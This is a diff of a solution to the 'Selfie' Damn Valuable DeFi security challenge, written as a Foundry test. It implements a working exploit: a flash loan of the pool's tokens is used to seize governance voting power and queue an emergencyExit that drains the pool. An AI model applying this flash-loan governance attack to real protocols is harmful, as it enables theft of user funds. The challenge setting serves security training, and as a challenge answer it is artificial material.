@@ -6,9 +6,10 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";//added by tina
 
 
-contract SelfieChallenge is Test {
+contract SelfieChallenge is Test, IERC3156FlashBorrower {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -63,9 +64,37 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-       
+
+        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
+
+        //2 day action delay
+        vm.warp(block.timestamp + 2 days);
+
+        governance.executeAction(1);
     }
 
+    //this get called by the pool during flashLoan
+    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)
+        external
+        override
+        returns (bytes32)
+    {
+        //gain governance voting power
+        token.delegate(address(this));
+
+        //queue an action to call emergencyExit
+        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        governance.queueAction(address(pool), 0, emergencyExitData);
+
+        // repay the pool
+        token.approve(address(pool), amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+        //this is why the exploit works: the flash loan allows temporary acquisition of voting power to queue a governance action(call emergencyExit) 
+
+    }
+    
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
